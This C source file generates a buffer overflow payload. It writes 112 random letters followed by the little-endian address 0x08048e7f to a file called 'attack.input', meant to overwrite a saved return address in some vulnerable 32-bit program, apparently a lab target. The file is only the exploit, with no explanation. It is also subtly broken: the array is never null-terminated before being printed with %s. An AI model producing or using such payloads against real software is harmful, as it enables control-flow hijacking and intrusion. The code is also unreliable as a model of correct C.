#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main(){
	srand(time(NULL));
	char outLine[116];
	int i;
	for(i=0;i<(112);i++){
		outLine[i] = 'A' + (random()%26);
	}
	outLine[i++] = 0x7f;
	outLine[i++] = 0x8e;
	outLine[i++] = 0x04;
	outLine[i++] = 0x08;
	
	FILE* fp;
	fp = fopen("attack.input","w");
	if(fp == NULL){
		return 0;
	}
	fprintf(fp,"%s",outLine);
	fclose(fp);
	return 1;
}
